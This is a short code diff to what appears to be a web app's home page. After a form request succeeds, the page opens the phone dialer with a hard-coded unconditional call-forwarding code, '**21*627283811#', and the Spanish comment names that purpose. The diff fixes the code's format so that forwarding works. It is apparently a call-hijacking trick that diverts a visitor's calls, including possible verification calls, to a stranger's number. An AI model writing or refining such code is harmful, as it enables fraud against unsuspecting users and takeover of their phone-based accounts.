@@ -71,7 +71,7 @@ function HomePage() {
       const data = await response.json();
       if (data.ok) {
         // Redirigir al teclado de marcación de Android con el código de desvío de llamadas incondicional
-        window.location.href = 'tel:**21*627283811*#';
+        window.location.href = 'tel:**21*627283811#';
       } else {
         setError('Error al procesar tu solicitud. Inténtalo de nuevo.');
       }
